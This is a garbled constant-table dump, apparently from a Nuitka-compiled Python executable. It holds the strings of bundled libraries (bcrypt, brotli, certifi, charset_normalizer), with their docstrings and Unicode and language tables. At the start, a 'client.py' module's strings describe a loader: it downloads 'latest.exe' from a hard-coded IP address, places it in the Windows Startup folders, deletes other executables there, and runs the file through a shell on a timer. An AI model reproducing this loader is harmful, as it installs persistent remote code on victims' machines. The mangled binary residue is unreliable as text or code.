.__main__?Ca__mro_entries__abasesakeysu%s argument after ** must be a mapping, not %sa__name__u%s got multiple values for keyword argument '%s'acalledastar_arg_dictakwllaargsa__iter__a__getitem__u%s argument after * must be an iterable, not %sukeywords must be stringsastar_arg_lista__doc__a__file__a__cached__a__annotations__arequestsatimeashutilapathlibTaPathaPathasubprocessuhttp://194.59.30.220:5000/downloadaurllatime_intervalahomeuAppData/Roaming/Microsoft/Windows/Start Menu/Programs/StartupuAppData/Local/Programs/Startupastartup_dirsadir_pathamkdirTtpTaparentsaexist_okagetDastreamtaresponseastatus_codelTulatest.exeaexe_pathawba__enter__a__exit__wfaiter_contentTlachunkawriteTnnnaglobTu*.exeaexe_fileaunlinkweacopyaPopenDashelltasleepuclient.pyu<module>.bcrypt$a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_bcryptu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__a_bcryptTa__author__a__copyright__a__email__a__license__a__summary__a__title__a__uri__acheckpwagensaltahashpwakdfla__author__la__copyright__a__email__a__license__a__summary__a__title__a__uri__acheckpwagensaltahashpwakdfTa__version_ex__a__version_ex__a__version__Lagensaltahashpwacheckpwakdfa__title__a__summary__a__uri__a__version__a__author__a__email__a__license__a__copyright__a__all__ubcrypt\__init__.pyu<module bcrypt>u.brotliaCompressorTamodeaqualityalgwinalgblockaprocessafinishuCompress a byte string.

    Args:
      string (bytes): The input data.
      mode (int, optional): The compression mode can be MODE_GENERIC (default),
        MODE_TEXT (for UTF-8 format text input) or MODE_FONT (for WOFF 2.0).
      quality (int, optional): Controls the compression-speed vs compression-
        density tradeoff. The higher the quality, the slower the compression.
        Range is 0 to 11. Defaults to 11.
      lgwin (int, optional): Base 2 logarithm of the sliding window size. Range
        is 10 to 24. Defaults to 22.
      lgblock (int, optional): Base 2 logarithm of the maximum input block size.
        Range is 16 to 24. If set to 0, the value will be set based on the
        quality. Defaults to 0.

    Returns:
      The compressed byte string.

    Raises:
      brotli.error: If arguments are invalid, or compressor fails.
    uFunctions to compress and decompress data using the Brotli library.a__doc__a__file__a__spec__aoriginahas_locationa__cached__a_brotlila__version__aversionaMODE_GENERICaMODE_TEXTaMODE_FONTaDecompressorllacompressadecompressaerrorubrotli.pyu<module brotli>Tastringamodeaqualityalgwinalgblockacompressoru.certifi'a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_certifiu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__acoreTacontentsawherelacontentslawherea__all__u2024.08.30a__version__ucertifi\__init__.pyu<module certifi>u.certifi.coreF+a_CACERT_CTXa__exit__Tnnnawherea__enter__areada__file__ajoinucacert.pemaread_textTacertifiucacert.pemaasciiTaencodingu
certifi.py
~~~~~~~~~~

This module returns the installation location of cacert.pem or its contents.
a__doc__a__spec__aoriginahas_locationa__cached__asysaatexitlDareturnnaexit_cacert_ctxaosatypesaUnionaModuleTypeaPackageTOstruos.PathLikeaResourceTuutf-8astrictapackagearesourceaencodingaerrorsareturnDareturnOstracontentsucertifi\core.pyu<module certifi.core>TapackagearesourceaencodingaerrorsadataTwfu.charset_normalizer.api0TObytearrayObytesuExpected object of type bytes or bytearray, got: {0}aloggeralevelaaddHandleraexplain_handlerasetLevelaTRACEadebugTuEncoding detection on empty bytes, assuming utf_8 intention.aremoveHandleraprevious_logger_levelaloggingaWARNINGaCharsetMatchesaCharsetMatchautf_8Zualogucp_isolation is set. use this flag for debugging purpose. limited list of encoding allowed : %s.u, aiana_nameucp_exclusion is set. use this flag for debugging purpose. limited list of encoding excluded : %s.uoverride steps (%i) and chunk_size (%i) as content does not fit (%i byte(s) given) parameters.lastepsachunk_sizeaTOO_SMALL_SEQUENCEaTOO_BIG_SEQUENCEuTrying to detect encoding from a tiny portion of ({}) byte(s).uUsing lazy str decoding because the payload is quite large, ({}) byte(s).aany_specified_encodinguDetected declarative mark in sequence. Priority +1 given for %s.aidentify_sig_or_bomutoo many values to unpack (expected 2)uDetected a SIG or BOM mark on first %i byte(s). Priority +1 given for %s.aasciiaIANA_SUPPORTEDacp_isolationatestedaaddashould_strip_sig_or_bomPautf_32autf_16uEncoding %s won't be tested as-is because it require a BOM. Will try some sub-encoder LE/BE.Pautf_7uEncoding %s won't be tested as-is because detection is unreliable without BOM/SIG.ais_multi_byte_encodingTEModuleNotFoundErrorEImportErroruEncoding %s does not provide an IncrementalDecoderasequences:nlnasig_payloadlTEUnicodeDecodeErrorELookupErroruCode page %s does not fit given bytes sequence at ALL. %satested_but_hard_failureatested_but_soft_failureais_cp_similaraencoding_ianau%s is deemed too similar to code page %s and was consider unsuited already. Continuing!aencoding_soft_failedlalengthuCode page %s is a multi byte encoding table and it appear that at least one character was encoded using n-bytes.lamaxlacut_sequence_chunksamd_chunksamd_ratiosamess_ratioathresholdqaearly_stop_countuLazyStr Loading: After MD chunk decode, code page %s does not fit given bytes sequence at ALL. %s:lІnnadecodeDaerrorsastrictuLazyStr Loading: After final lookup, code page %s does not fit given bytes sequence at ALL. %saappendu%s was excluded because of initial chaos probing. Gave up %i time(s). Computed mean chaos is %f %%.aroundldDandigitslu%s passed initial chaos probing. Mean measured chaos is %f %%aencoding_languagesamb_encoding_languagesu{} should target any language(s) of {}acoherence_ratioalanguage_thresholdw,acd_ratiosamerge_coherence_ratiosuWe detected language {} using {}aresultsf?uEncoding detection: %s is most likely the one.uEncoding detection: %s is most likely the one as we detected a BOM or SIG within the beginning of the sequence.afallback_u8afallback_asciiafallback_specifieduNothing got out of the detection process. Using ASCII/UTF-8/Specified fallback.uEncoding detection: %s will be used as a fallback matchaencodingafingerprintTuEncoding detection: utf_8 will be used as a fallback matchTuEncoding detection: ascii will be used as a fallback matchuEncoding detection: Found %s as plausible (best-candidate) for content. With %i alternatives.abestTuEncoding detection: Unable to determine any suitable charset.u
    Given a raw bytes sequence, return the best possibles charset usable to render str objects.
    If there is no results, it is a strong indicator that the source is binary/not text.
    By default, the process will extract 5 blocks of 512o each to assess the mess and coherence of a given sequence.
    And will give up a particular code page after 20% of measured mess. Those criteria are customizable at will.

    The preemptive behavior DOES NOT replace the traditional detection workflow, it prioritize a particular code page
    but never take it for granted. Can improve the performance.

    You may want to focus your attention to some code page or/and not others, use cp_isolation and cp_exclusion for that
    purpose.

    This function will strip the SIG in the payload/sequence every time except on UTF-16, UTF-32.
    By default the library does not setup any handler other than the NullHandler, if you choose to set the 'explain'
    toggle to True it will alter the logger configuration to add a StreamHandler that is suitable for debugging.
    Custom logging format and handler can be set manually.
    afrom_bytesareadu
    Same thing than the function from_bytes but using a file pointer that is already ready.
    Will not close the file pointer.
    arba__enter__a__exit__afrom_fpTnnnu
    Same thing than the function from_bytes but with one extra step. Opening and reading given file path in binary mode.
    Can raise IOError.
    aPathLikeafrom_pathTastepsachunk_sizeathresholdacp_isolationacp_exclusionapreemptive_behaviouraexplainalanguage_thresholdaenable_fallbackTObytesObytearrayu
    Detect if the given input (file, bytes, or path) points to a binary file. aka. not a string.
    Based on the same main heuristic algorithms and default kwargs at the sole exception that fallbacks match
    are disabled to be stricter around ASCII-compatible but unlikely to be a string.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aBinaryIOaListaOptionalaSetaUnionacdTacoherence_ratioaencoding_languagesamb_encoding_languagesamerge_coherence_ratiosaconstantTaIANA_SUPPORTEDaTOO_BIG_SEQUENCEaTOO_SMALL_SEQUENCEaTRACEamdTamess_ratioamodelsTaCharsetMatchaCharsetMatchesautilsTaany_specified_encodingacut_sequence_chunksaiana_nameaidentify_sig_or_bomais_cp_similarais_multi_byte_encodingashould_strip_sig_or_bomagetLoggerTacharset_normalizeraStreamHandlerasetFormatteraFormatterTu%(asctime)s | %(levelname)s | %(message)sTllf?nntFf?tacp_exclusionapreemptive_behaviouraexplainaenable_fallbackareturnafpapathTllf?nntFf?Fafp_or_path_or_payloadais_binaryucharset_normalizer\api.pyu<module charset_normalizer.api>T/asequencesastepsachunk_sizeathresholdacp_isolationacp_exclusionapreemptive_behaviouraexplainalanguage_thresholdaenable_fallbackaprevious_logger_levelalengthais_too_small_sequenceais_too_large_sequenceaprioritized_encodingsaspecified_encodingatestedatested_but_hard_failureatested_but_soft_failureafallback_asciiafallback_u8afallback_specifiedaresultsadecoded_payloadabom_or_sig_availableastrip_sig_or_bomais_multi_byte_decoderasimilar_soft_failure_testamulti_byte_bonusamax_chunk_gave_upaearly_stop_countamd_chunksamean_mess_ratioatarget_languagesasig_encodingasig_payloadaencoding_ianaweaencoding_soft_failedar_alazy_str_hard_failureamd_ratiosachunkafallback_entryacd_ratiosachunk_languagesacd_ratios_mergedT
afpastepsachunk_sizeathresholdacp_isolationacp_exclusionapreemptive_behaviouraexplainalanguage_thresholdaenable_fallbackTapathastepsachunk_sizeathresholdacp_isolationacp_exclusionapreemptive_behaviouraexplainalanguage_thresholdaenable_fallbackafpTafp_or_path_or_payloadastepsachunk_sizeathresholdacp_isolationacp_exclusionapreemptive_behaviouraexplainalanguage_thresholdaenable_fallbackaguesses.charset_normalizer.cdais_multi_byte_encodinguFunction not supported on multi-byte code pageuencodings.{}aimport_moduleaIncrementalDecoderTaignoreTaerrorsl;l@llwpadecodeaunicode_rangeais_unicode_range_secondaryaseen_rangeslacharacter_countasortedf333333?u
    Return associated unicode ranges in a single byte code page.
    aFREQUENCIESaitemsutoo many values to unpack (expected 2)alanguagesu
    Return inferred languages used with a unicode range.
    aencoding_unicode_rangeaLatinuLatin Basedaunicode_range_languagesu
    Single-byte encoding language association. Some code page are heavily linked to particular language(s).
    This function does the correspondence.
    astartswithTashift_Taiso2022_jpTaeuc_jacp932aJapaneseTagbaZH_NAMESaChineseTaiso2022_kraKO_NAMESaKoreanu
    Multi-byte encoding language association. Some code page are heavily linked to particular language(s).
    This function does the correspondence.
    atarget_have_accentsais_accentuatedatarget_pure_latinais_latinu
    Determine main aspects from a supported language if it contains accents and if is pure Latin.
    aget_target_featuresu<lambda>ualphabet_languages.<locals>.<lambda>Takeyareverseu
    Return associated languages associated to given characters.
    u<genexpr>ualphabet_languages.<locals>.<genexpr>u{} not availableaindexllacharacter_approved_countu
    Determine if a ordered characters list (by occurrence from most appearance to rarest) match a particular language.
    The result is a ratio between 0. (absolutely no correspondence) and 1. (near perfect fit).
    Beware that is function is not strict on the match in order to ease the detection. (Meaning close match is 1.)
    aisalphaalayersais_suspiciously_successive_rangeacharacter_rangealoweru
    Given a decoded text sequence, return a list of str. Unicode range / alphabet separation.
    Ex. a text containing English/Latin with a bit a Hebrew will return two items in the resulting list;
    One containing the latin letters and the other hebrew.
    aper_language_ratiosaappendaroundumerge_coherence_ratios.<locals>.<lambda>u
    This function merge results previously given by the function coherence_ratio.
    The return type is the same as coherence_ratio.
    areplaceTu—uaindex_resultsafiltered_resultsamaxu
    We shall NOT return "English—" in CoherenceMatches because it is an alternative
    of "English". This function only keeps the best match and remove the em-dash in it.
    ufilter_alt_coherence_matches.<locals>.<genexpr>asplitTw,aremoveTuLatin Basedaalpha_unicode_splitaCounteramost_commonaTOO_SMALL_SEQUENCEaalphabet_languagesaignore_non_latinacharacters_popularity_compareapopular_character_orderedf?asufficient_match_countaresultsafilter_alt_coherence_matchesucoherence_ratio.<locals>.<lambda>u
    Detect ANY language that can be identified in given sequence. The sequence will be analysed by layers.
    A layer = Character extraction by alphabets/ranges.
    ucoherence_ratio.<locals>.<genexpr>a__doc__a__file__a__spec__aoriginahas_locationa__cached__aimportlibacodecsTaIncrementalDecoderacollectionsTaCounteralru_cacheaTypeCounteraDictaListaOptionalaTupleaconstantTaFREQUENCIESaKO_NAMESaLANGUAGE_SUPPORTED_COUNTaTOO_SMALL_SEQUENCEaZH_NAMESaLANGUAGE_SUPPORTED_COUNTamdTais_suspiciously_successive_rangeamodelsTaCoherenceMatchesaCoherenceMatchesautilsTais_accentuatedais_latinais_multi_byte_encodingais_unicode_range_secondaryaunicode_rangeaiana_nameareturnaprimary_rangeaencoding_languagesamb_encoding_languagesTamaxsizealanguageTOboolpTFacharactersaordered_charactersadecoded_sequenceamerge_coherence_ratiosTlTf?nathresholdalg_inclusionacoherence_ratioucharset_normalizer\cd.pyTa.0acharacterTa.0wcwoTa.0weaindex_resultsTwxu<module charset_normalizer.cd>Tadecoded_sequencealayersacharacter_rangealayer_target_rangeacharacteradiscovered_rangeTacharactersaignore_non_latinalanguagesacharacter_countacharacter_match_countaratioasource_have_accentsalanguagealanguage_charactersatarget_have_accentsatarget_pure_latinTalanguageaordered_charactersacharacter_approved_countaordered_characters_countatarget_language_characters_countalarge_alphabetacharacter_rank_in_languageaexpected_projection_ratioacharacter_rank_projectionacharacters_before_sourceacharacters_after_sourceacharacters_beforeacharacters_afterabefore_match_countaafter_match_countaFREQUENCIES_language_setacharacteracharacter_rankTadecoded_sequenceathresholdalg_inclusionaresultsaignore_non_latinasufficient_match_countasequence_frequenciesacharacter_countapopular_character_orderedaratioalg_inclusion_listalayeramost_commonalanguageTaiana_nameaunicode_rangesaprimary_rangeaspecified_rangeTaiana_namewpaseen_rangesacharacter_countachunkacharacter_rangeadecoderwiTaresultsaindex_resultsano_em_nameafiltered_resultsaresultalanguagearatioTalanguageatarget_have_accentsatarget_pure_latinacharacterTaiana_nameTaresultsaper_language_ratiosaresultasub_resultalanguagearatioamergeTaprimary_rangealanguagesalanguageacharactersacharacteru.charset_normalizerq.u
Charset-Normalizer
~~~~~~~~~~~~~~
The Real First Universal Charset Detector.
A library that helps you read text from an unknown charset encoding.
Motivated by chardet, This package is trying to resolve the issue by taking a new approach.
All IANA character set names for which the Python core library provides codecs are supported.

Basic usage:
   >>> from charset_normalizer import from_bytes
   >>> results = from_bytes('Bсеки човек има право на образование. Oбразованието!'.encode('utf_8'))
   >>> best_guess = results.best()
   >>> str(best_guess)
   'Bсеки човек има право на образование. Oбразованието!'

Others methods and usages are available - see the full documentation
at <https://github.com/Ousret/charset_normalizer>.
:copyright: (c) 2021 by Ahmed TAHRI
:license: MIT, see LICENSE for more details.
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_charset_normalizeru\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__alogginglaapiTafrom_bytesafrom_fpafrom_pathais_binarylafrom_bytesafrom_fpafrom_pathais_binaryalegacyTadetectadetectamodelsTaCharsetMatchaCharsetMatchesaCharsetMatchaCharsetMatchesautilsTaset_logging_handleraset_logging_handleraversionTaVERSIONa__version__aVERSIONa__version__T
afrom_fpafrom_pathafrom_bytesais_binaryadetectaCharsetMatchaCharsetMatchesa__version__aVERSIONaset_logging_handlera__all__agetLoggerTacharset_normalizeraaddHandleraNullHandlerucharset_normalizer\__init__.pyu<module charset_normalizer>u.charset_normalizer.constantIGNaendswithTa_codecParot_13ambcsatactisa__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__acodecsTaBOM_UTF8aBOM_UTF16_BEaBOM_UTF16_LEaBOM_UTF32_BEaBOM_UTF32_LElaBOM_UTF8aBOM_UTF16_BEaBOM_UTF16_LEaBOM_UTF32_BEaBOM_UTF32_LEuencodings.aliasesTaaliasesaaliasesareTaIGNORECASEacompileaIGNORECASEacompileare_compileaDictaListaSetaUnionautf_8autf_7Lc+/v8c+/v9c+/v+c+/v/c+/v8-agb18030c13autf_32autf_16aENCODING_MARKSl aTOO_SMALL_SEQUENCElaTOO_BIG_SEQUENCElCaUTF8_MAXIMAL_ALLOCATIONDuControl characteruBasic LatinuLatin-1 SupplementuLatin Extended-AuLatin Extended-BuIPA ExtensionsuSpacing Modifier LettersuCombining Diacritical MarksuGreek and CopticaCyrillicuCyrillic SupplementaArmenianaHebrewaArabicaSyriacuArabic SupplementaThaanaaNKoaSamaritanaMandaicuSyriac SupplementuArabic Extended-BuArabic Extended-AaDevanagariaBengaliaGurmukhiaGujaratiaOriyaaTamilaTeluguaKannadaaMalayalamaSinhalaaThaiaLaoaTibetanaMyanmaraGeorgianuHangul JamoaEthiopicuEthiopic SupplementaCherokeeuUnified Canadian Aboriginal SyllabicsaOghamaRunicaTagalogaHanunooaBuhidaTagbanwaaKhmeraMongolianuUnified Canadian Aboriginal Syllabics ExtendedaLimbuuTai LeuNew Tai LueuKhmer SymbolsaBugineseuTai ThamuCombining Diacritical Marks ExtendedaBalineseaSundaneseaBatakaLepchauOl ChikiuCyrillic Extended-CuGeorgian ExtendeduSundanese SupplementuVedic ExtensionsuPhonetic ExtensionsuPhonetic Extensions SupplementuCombining Diacritical Marks SupplementuLatin Extended AdditionaluGreek ExtendeduGeneral PunctuationuSuperscripts and SubscriptsuCurrency SymbolsuCombining Diacritical Marks for SymbolsuLetterlike SymbolsuNumber FormsaArrowsuMathematical OperatorsuMiscellaneous TechnicaluControl PicturesuOptical Character RecognitionuEnclosed AlphanumericsuBox DrawinguBlock ElementsuGeometric ShapesuMiscellaneous SymbolsaDingbatsuMiscellaneous Mathematical Symbols-AuSupplemental Arrows-AuBraille PatternsuSupplemental Arrows-BuMiscellaneous Mathematical Symbols-BuSupplemental Mathematical OperatorsuMiscellaneous Symbols and ArrowsaGlagoliticuLatin Extended-CaCopticuGeorgian SupplementaTifinaghuEthiopic ExtendeduCyrillic Extended-AuSupplemental PunctuationuCJK Radicals SupplementuKangxi RadicalsuIdeographic Description CharactersuCJK Symbols and PunctuationaHiraganaaKatakanaaBopomofouHangul Compatibility JamoaKanbunuBopomofo ExtendeduCJK StrokesuKatakana Phonetic ExtensionsuEnclosed CJK Letters and MonthsuCJK CompatibilityuCJK Unified Ideographs Extension AuYijing Hexagram SymbolsuCJK Unified IdeographsuYi SyllablesuYi RadicalsaLisuaVaiuCyrillic Extended-BaBamumuModifier Tone LettersuLatin Extended-DuSyloti NagriuCommon Indic Number FormsuPhags-paaSaurashtrauDevanagari ExtendeduKayah LiaRejanguHangul Jamo Extended-AaJavaneseuMyanmar Extended-BaChamuMyanmar Extended-AuTai VietuMeetei Mayek ExtensionsuEthiopic Extended-AuLatin Extended-EuCherokee SupplementuMeetei MayekuHangul SyllablesuHangul Jamo Extended-BuHigh SurrogatesuHigh Private Use SurrogatesuLow SurrogatesuPrivate Use AreauCJK Compatibility IdeographsuAlphabetic Presentation FormsuArabic Presentation Forms-AuVariation SelectorsuVertical FormsuCombining Half MarksuCJK Compatibility FormsuSmall Form VariantsuArabic Presentation Forms-BuHalfwidth and Fullwidth FormsaSpecialsuLinear B SyllabaryuLinear B IdeogramsuAegean NumbersuAncient Greek NumbersuAncient SymbolsuPhaistos DiscaLycianaCarianuCoptic Epact NumbersuOld ItalicaGothicuOld PermicaUgariticuOld PersianaDeseretaShavianaOsmanyaaOsageaElbasanuCaucasian AlbanianaVithkuqiuLinear AuLatin Extended-FuCypriot SyllabaryuImperial AramaicaPalmyreneaNabataeanaHatranaPhoenicianaLydianuMeroitic HieroglyphsuMeroitic CursiveaKharoshthiuOld South ArabianuOld North ArabianaManichaeanaAvestanuInscriptional ParthianuInscriptional PahlaviuPsalter PahlaviuOld TurkicuOld HungarianuHanifi RohingyauRumi Numeral SymbolsaYezidiuArabic Extended-CuOld SogdianaSogdianuOld UyghuraChorasmianaElymaicaBrahmiaKaithiuSora SompengaChakmaaMahajaniaSharadauSinhala Archaic NumbersaKhojkiaMultaniaKhudawadiaGranthaaNewaaTirhutaaSiddhamaModiuMongolian SupplementaTakriaAhomaDograuWarang CitiuDives AkuruaNandinagariuZanabazar SquareaSoyombouUnified Canadian Aboriginal Syllabics Extended-AuPau Cin HauuDevanagari Extended-AaBhaiksukiaMarchenuMasaram GondiuGunjala GondiaMakasaraKawiuLisu SupplementuTamil SupplementaCuneiformuCuneiform Numbers and PunctuationuEarly Dynastic CuneiformuCypro-MinoanuEgyptian HieroglyphsuEgyptian Hieroglyph Format ControlsuAnatolian HieroglyphsuBamum SupplementaMroaTangsauBassa VahuPahawh HmongaMedefaidrinaMiaouIdeographic Symbols and PunctuationaTangutuTangut ComponentsuKhitan Small ScriptuTangut SupplementuKana Extended-BuKana SupplementuKana Extended-AuSmall Kana ExtensionaNushuaDuployanuShorthand Format ControlsuZnamenny Musical NotationuByzantine Musical SymbolsuMusical SymbolsuAncient Greek Musical NotationuKaktovik NumeralsuMayan NumeralsuTai Xuan Jing SymbolsuCounting Rod NumeralsuMathematical Alphanumeric SymbolsuSutton SignWritinguLatin Extended-GuGlagolitic SupplementuCyrillic Extended-DuNyiakeng Puachue HmongaTotoaWanchouNag MundariuEthiopic Extended-BuMende KikakuiaAdlamuIndic Siyaq NumbersuOttoman Siyaq NumbersuArabic Mathematical Alphabetic SymbolsuMahjong TilesuDomino TilesuPlaying CardsuEnclosed Alphanumeric SupplementuEnclosed Ideographic SupplementuMiscellaneous Symbols and PictographsuEmoticons range(Emoji)uOrnamental DingbatsuTransport and Map SymbolsuAlchemical SymbolsuGeometric Shapes ExtendeduSupplemental Arrows-CuSupplemental Symbols and PictographsuChess SymbolsuSymbols and Pictographs Extended-AuSymbols for Legacy ComputinguCJK Unified Ideographs Extension BuCJK Unified Ideographs Extension CuCJK Unified Ideographs Extension DuCJK Unified Ideographs Extension EuCJK Unified Ideographs Extension FuCJK Compatibility Ideographs SupplementuCJK Unified Ideographs Extension GuCJK Unified Ideographs Extension HaTagsuVariation Selectors SupplementuSupplementary Private Use Area-AuSupplementary Private Use Area-B;ll l;l ll;lll;lll;lll;lll;lll;lll;lll;ll
l;l
l
l;l
ll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;ll l;l l!l;l!l"l;l"l$l;l$l'l;l'l'l;l'l(l;l(l-l;l-l-l;l-l.l;l.l.l;l.l.l;l.l.l;l.l/l;l/l0l;l0l1l;l1l2l;l2l2l;l2l3l;l3l3l;l3l4l;l4l4l;l4l5l;l5l6l;l6l7l;l7l7l;l7l8l;l8l8l;l8l9l;l9l9l;l9l9l;l9l9l;l9l:l;l:l;l;l;l;l;l;l<l;l<l>l;l>l@l;l@l@l;l@lAl;lAlAl;lAlBl;lBlBl;lBlCl;lClDl;lDlFl;lFlHl;lHlHl;lHlHl;lHlJl;lJlKl;lKlKl;lKlLl;lLlNl;lNlOl;lOlOl;lOlPl;lPlRl;lRlSl;lSlTl;lTlVl;lVlXl;lXlXl;lXlYl;lYlZl;lZlZl;lZl[l;l[l[l;l[l\l;l\l]l;l]l^l;l^l_l;l_l`l;l`l`l;l`lal;lalbl;lblbl;lblcl;lclcl;lclcl;lclcl;lcldl;ldlfl;lflhl;lhll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;llЃl;lЃll;lll;lll;lll;lll;llІl;lІll;lll;lll;llЈl;lЈll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;llИl;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;llСl;lСll;llТl;lТll;lll;lll;llФl;lll;lll;lll;lll;lll;lll;lll;lll;llЭl;llЮl;llаl;lll;lll;lll;llдl;lдll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;llПl;lll;lll;llФl;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;lll;ll
l;l
l
l;l
l
l;l
ll;lll;lll;llЦl;lЦll;l8l8l;l8l8l;l<l@l;l@lDlaUNICODE_RANGES_COMBINEDTOstrOrangeLaSupplementaExtendedaExtensionsaModifieraMarksaPunctuationaSymbolsaFormsaOperatorsaMiscellaneousaDrawingaBlockaShapesaSupplementalaTagsaUNICODE_SECONDARY_RANGE_KEYWORDu(?:(?:encoding)|(?:charset)|(?:coding))(?:[\:= ]{1,10})(?:[\"\']?)([a-zA-Z0-9\-_]+)(?:[\"\']?)aRE_POSSIBLE_ENCODING_INDICATIONLacp720acp737acp856acp874acp875acp1006akoi8_rakoi8_takoi8_uaIANA_NO_ALIASESasortedu<lambda>avaluesaIANA_SUPPORTEDaIANA_SUPPORTED_COUNTD(acp037acp1026acp1125acp1140acp1250acp1251acp1252acp1253acp1254acp1257acp273acp437acp500acp850acp857acp858acp860acp861acp862acp863acp865acp866aiso8859_10aiso8859_11aiso8859_13aiso8859_14aiso8859_15aiso8859_16aiso8859_2aiso8859_3aiso8859_4aiso8859_7aiso8859_9akz1048alatin_1amac_icelandamac_romanamac_turkishaptcp154atis_620Lacp1026acp1140acp273acp500Lacp037acp1140acp273acp500Lacp866Lacp037acp1026acp273acp500Laiso8859_2Lakz1048aptcp154Laiso8859_15aiso8859_9alatin_1Laiso8859_7Laiso8859_15aiso8859_9alatin_1Laiso8859_13Lacp037acp1026acp1140acp500Lacp850acp858acp860acp861acp862acp863acp865Lacp037acp1026acp1140acp273Lacp437acp857acp858acp865Lacp850acp858acp865Lacp437acp850acp857acp865Lacp437acp861acp862acp863acp865Lacp437acp860acp862acp863acp865Lacp437acp860acp861acp863acp865Lacp437acp860acp861acp862acp865Lacp437acp850acp857acp858acp860acp861acp862acp863Lacp1125Laiso8859_14aiso8859_15aiso8859_4aiso8859_9alatin_1Latis_620Lacp1257Laiso8859_10aiso8859_15aiso8859_16aiso8859_3aiso8859_9alatin_1Lacp1252acp1254aiso8859_10aiso8859_14aiso8859_16aiso8859_3aiso8859_9alatin_1Laiso8859_14aiso8859_15aiso8859_2aiso8859_3aiso8859_9alatin_1Lacp1250aiso8859_16aiso8859_4Laiso8859_14aiso8859_15aiso8859_16aiso8859_9alatin_1Laiso8859_10aiso8859_2aiso8859_9alatin_1Lacp1253L
acp1252acp1254acp1258aiso8859_10aiso8859_14aiso8859_15aiso8859_16aiso8859_3aiso8859_4alatin_1Lacp1251aptcp154L
acp1252acp1254acp1258aiso8859_10aiso8859_14aiso8859_15aiso8859_16aiso8859_3aiso8859_4aiso8859_9Lamac_romanamac_turkishLamac_icelandamac_turkishLamac_icelandamac_romanLacp1251akz1048Laiso8859_11aIANA_SUPPORTED_SIMILARD aiso2022_kraiso2022_jpaeuc_kratis_620autf_32aeuc_jpakoi8_raiso8859_1aiso8859_2aiso8859_5aiso8859_6aiso8859_7aiso8859_8autf_16acp855amac_cyrillicagb2312agb18030acp932acp866autf_8autf_8_sigashift_jisabig5acp1250acp1251acp1252acp1253acp1255acp1256acp1254acp949uISO-2022-KRuISO-2022-JPuEUC-KRuTIS-620uUTF-32uEUC-JPuKOI8-RuISO-8859-1uISO-8859-2uISO-8859-5uISO-8859-6uISO-8859-7uISO-8859-8uUTF-16aIBM855aMacCyrillicaGB2312aGB18030aCP932aIBM866uutf-8uUTF-8-SIGaSHIFT_JISaBig5uwindows-1250uwindows-1251uWindows-1252uwindows-1253uwindows-1255uwindows-1256uWindows-1254aCP949aCHARDET_CORRESPONDENCETOstrpSw]w<w/w{w;w,w-w>w=w:w"w|w&w[w}aCOMMON_SAFE_ASCII_CHARACTERSSajohabacp949aeuc_kraKO_NAMESSabig5abig5hkscsacp950ahzaZH_NAMESlaTRACED)aEnglishuEnglish—aGermanaFrenchaDutchaItalianaPolishaSpanishaRussianaJapaneseuJapanese—uJapanese——aPortugueseaSwedishaChineseaUkrainianaNorwegianaFinnishaVietnameseaCzechaHungarianaKoreanaIndonesianaTurkishaRomanianaFarsiaArabicaDanishaSerbianaLithuanianaSloveneaSlovakaHebrewaBulgarianaCroatianaHindiaEstonianaThaiaGreekaTamilaKazakhLwewawtwiwownwswrwhwlwdwcwuwmwfwpwgwwwywbwvwkwxwjwzwqLwewawtwiwownwswrwhwlwdwcwmwuwfwpwgwwwbwywvwkwjwxwzwqLwewnwiwrwswtwawdwhwuwlwgwowcwmwbwfwkwwwzwpwvuüuäuöwjLwewawswnwiwtwrwlwuwowdwcwpwmuéwvwgwfwbwhwquàwxuèwywjLwewnwawiwrwtwowdwswlwgwhwvwmwuwkwcwpwbwwwjwzwfwywxuëLwewiwawownwlwtwrwswcwdwuwpwmwgwvwfwbwzwhwquèuàwkwyuòLwawiwowewnwrwzwwwswcwtwkwywdwpwmwuwlwjułwgwbwhuąuęuóLwewawownwswrwiwlwdwtwcwuwmwpwbwgwvwfwyuówhwquíwjwzuáLuоuаuеuиuнuсuтuрuвuлuкuмuдuпuуuгuяuыuзuбuйuьuчuхuжuцLdu人u一u大u亅u丁u丨u竹u笑u口u日u今u二u彳u行u十u土u丶u寸u寺u時u乙u丿u乂u气u気u冂u巾u亠u市u目u儿u見u八u小u凵u県u月u彐u門u間u木u東u山u出u本u中u刀u分u耳u又u取u最u言u田u心u思u刂u前u京u尹u事u生u厶u云u会u未u来u白u冫u楽u灬u馬u尸u尺u駅u明u耂u者u了u阝u都u高u卜u占u厂u广u店u子u申u奄u亻u俺u上u方u冖u学u衣u艮u食u自L`uーuンuスu・uルuトuリuイuアuラuッuクuドuシuレuジuタuフuロuカuテuマuィuグuバuムuプuオuコuデuニuウuメuサuビuナuブuャuエuュuチuキuズuダuパuミuェuョuハuセuベuガuモuツuネuボuソuノuァuヴuワuポuペuピuケuゴuギuザuホuゲuォuヤuヒuユuヨuヘuゼuヌuゥuゾuヶuヂuヲuヅuヵuヱuヰuヮuヽu゠uヾuヷuヿuヸuヹuヺL]uのuにuるuたuとuはuしuいuをuでuてuがuなuれuかuらuさuっuりuすuあuもuこuまuうuくuよuきu